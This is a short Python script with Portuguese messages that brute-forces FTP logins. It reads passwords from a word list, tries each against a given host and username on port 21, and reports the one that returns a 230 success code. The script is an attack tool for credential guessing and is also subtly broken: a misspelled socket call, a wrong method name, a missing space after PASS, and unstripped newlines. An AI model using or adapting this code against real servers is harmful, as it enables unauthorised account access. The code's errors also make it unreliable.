import os
import sys
import re
import time
import socket

if len(sys.argv) < 3:
	print("Use: python logger.py + host + username")
	sys.exit()

server = sys.argv[1]
user = sys.argv[2]

file = open("lista.txt")
for key in file.readLines():
	print("Testando\nUser: %s\n Pass: %s"%(user, key))
	s = socket.socket(socket.AF_INET, sticket.SOCK_STREAM)
	s.connect((server, 21))
	s.recv(1024)
	s.send("USER "+user+"\r\n")
	s.recv(1024)
	s.send("PASS"+key+"\r\n")
	res = s.recv(1024)
	s.send("QUIT\r\n")


	if re.search("230", res):
		print("senha encontrada!\n>> %s"%(key))
		break
	else:
		print("Acesso negado")
		time.sleep(3)
		os.system('clear')
		